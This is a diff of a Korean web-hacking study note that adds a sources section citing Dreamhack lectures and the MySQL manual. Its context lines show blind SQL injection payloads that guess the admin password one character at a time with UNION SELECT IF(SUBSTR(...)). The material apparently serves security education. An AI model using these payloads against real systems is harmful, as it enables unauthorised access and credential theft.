@@ -291,3 +291,11 @@ SQL의 IF문을 사용해 비교 구문을 만들어서 관리자 계정의 비�
         | 2 | ```' UNION SELECT IF(SUBSTR(password, 1, 1)='P', 'admin', 'not admin') FROM users WHERE username='admin'-- -``` | True |
         | 3 | ```' UNION SELECT IF(SUBSTR(password, 2, 1)='a', 'admin', 'not admin') FROM users WHERE username='admin'-- -``` | True |
         | 4 | ... | ... |
+
+
+<br/><br/><br/><br/>
+
+### 🔖 출처
+* [드림핵 Web Hacking Advanced - Server Side] 📌 [Background: SQL DML](https://dreamhack.io/lecture/courses/302)
+* [드림핵 Web Hacking Advanced - Server Side] 📌 [Background: SQL Features](https://dreamhack.io/lecture/courses/303)
+* 참고: [MySQL 8.0 Reference Manual](https://dev.mysql.com/doc/refman/8.0/en/)
